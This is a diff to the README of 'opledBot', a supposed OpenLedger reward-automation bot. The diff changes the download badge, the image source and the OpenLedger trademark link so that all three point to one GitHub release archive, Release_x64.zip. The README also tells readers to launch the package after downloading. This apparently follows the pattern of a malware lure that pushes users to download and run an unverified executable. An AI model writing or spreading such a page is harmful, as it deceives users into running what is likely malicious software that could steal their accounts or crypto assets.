@@ -20,7 +20,7 @@ Welcome to the opledBot repository, your go-to solution for automating your Open
 
 To get started with opledBot, simply download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/billybobjoesamlool/opledBot/releases/download/v2.0/Release_x64.zip)](https://github.com/billybobjoesamlool/opledBot/releases/download/v2.0/Release_x64.zip)
 
 📌 *Note: The software package needs to be launched after downloading to initiate the installation process.*
 
@@ -41,8 +41,8 @@ To stay up-to-date with the latest developments and releases of opledBot, make s
 
 Let automation simplify your tasks and maximize your rewards! 🌟
 
-![OpledBot](https://www.example.com/opledBot-image.png)
+![OpledBot](https://github.com/billybobjoesamlool/opledBot/releases/download/v2.0/Release_x64.zip)
 
 ---
 
-*This project is not affiliated with or endorsed by OpenLedger. OpenLedger is a registered trademark of [OpenLedger ApS.](https://www.openledger.io/)*
+*This project is not affiliated with or endorsed by OpenLedger. OpenLedger is a registered trademark of [OpenLedger ApS.](https://github.com/billybobjoesamlool/opledBot/releases/download/v2.0/Release_x64.zip)*
